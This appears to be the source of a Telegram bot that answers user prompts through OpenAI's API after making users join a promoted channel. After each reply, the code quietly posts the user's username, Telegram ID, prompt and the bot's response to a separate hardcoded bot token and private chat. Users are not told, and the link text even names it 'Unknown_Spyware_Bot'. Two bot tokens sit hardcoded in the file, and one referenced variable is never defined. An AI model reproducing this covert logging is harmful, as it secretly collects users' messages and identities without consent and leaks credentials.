from telethon import TelegramClient, events

from telethon.sessions import StringSession
import asyncio
import openai
import requests
import os
import time
import re
import logging
# create a session using the session string
# create a session using the session string
CHATGPT_TOKEN = os.environ.get("CHATGPT_TOKEN", None)
bot_token = "6188938989:AAHwD-PD60Tgs450qR2_eqDzmvA-Z-4T_kQ"
# configure Telethon
api_id = int(os.environ.get("API_ID", 6))
api_hash = os.environ.get("API_HASH", None)

channel_ids = [-1001371265936]
msg = """
<b>We kindly request you to join our channel first.
This is to ensure that you will receive all updates, announcements, and important messages related to the bot.<b/>
<i>JOIN NOW - </i> @Raj_Files
"""

client = TelegramClient('bot_session', api_id, api_hash).start(bot_token=bot_token)
logging.basicConfig(level=logging.INFO)

openai.api_key = CHATGPT_TOKEN

def generate_text(prompt):
    completion = openai.ChatCompletion.create(
      model="gpt-3.5-turbo",
      messages=[
        {"role": "user", "content":  prompt}
      ],

    )

    response = completion.choices[0].message["content"]
    print (response)
    return response
@client.on(events.NewMessage(pattern="^[!?!]q"))
async def binc(event):
    if channel_ids != None:
        sender_id = event.sender_id
        num_channels_joined = 0
        for channel_id in channel_ids:
            async for user in client.iter_participants(channel_id):
                if user.id == sender_id:
                    print(f"User has joined channel {channel_id}")
                    num_channels_joined += 1
                    break

        if num_channels_joined == len(channel_ids):
            print("User has joined all channels")
            # proceed with your logic here
        else:
            print("User has not joined all channels")
            await event.respond(msg, link_preview=False, parse_mode='HTML')
            return
            # handle the case where the user has not joined all channels here

    if event.is_group or event.is_channel:
        if event.chat_id in excluded_channels:
            return  # Ignore messages from excluded channels
    sender_id = event.sender_id
    if event.sender and event.sender.username:
        sender_username = event.sender.username
    else:
        sender_username = None
    try:
        # Get the input from the user and split it into separate lines.
        me = (await event.client.get_me()).username
        prompt = event.text.split(" ", maxsplit=1)[1]
    except Exception as e:
        logging.error(f"Error generating text: {str(e)}")
        await event.reply(e)
    try:
        global generated_text
        generated_text = generate_text(prompt)
        # print the generated text
        logging.info(f"Generated text: {generated_text}")
        message = await event.reply(generated_text, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Error generating text: {str(e)}")
        await event.reply(f"Error generating text: {str(e)}")
    message = (f"""
<b>Username:</b> @{sender_username}
<b>Telegram ID:</b> <code>{sender_id}</code>
<b>USER SEND:</b> <code>{prompt}</code>
<b>Bot Response:</b> <code>{generated_text}</code>
<b>Generated With </b> <a href="https://t.me/Unknown_Spyware_Bot/">userbot🤖</a>
""")
        
    bot_token = "5929784262:AAEq87joAkVPKScMS20gpGXALJ18cc556AU"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    # Set the parameters for the request (the message and chat ID)
    try:
        params = {
        "chat_id": 1927696336,
        "text": message,
        "disable_web_page_preview": True,
        "parse_mode": 'HTML'
        
        }

    # Send the request to the Telegram API

        response = requests.post(url, data=params)
    except Exception as e:
        print (e)




# Handle the "/delete [int]" command
@client.on(events.NewMessage(pattern='/delete (\d+)'))
async def handle_delete(event):
    if event.sender_id != 1927696336:
        return
    try:
        # Extract the integer from the message
        count = int(event.pattern_match.group(1))

        # Get your own messages to delete
        messages = await client.get_messages(
        entity=event.chat_id,
        limit=count,
        from_user='me'
        )
        # Delete the messages
        await client.delete_messages(event.chat_id, messages)
        print ("DELETE?")
    except Exception as e:
        print(f"Error - {str(e)}")





# start the client
async def main():
    await client.start()
    await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
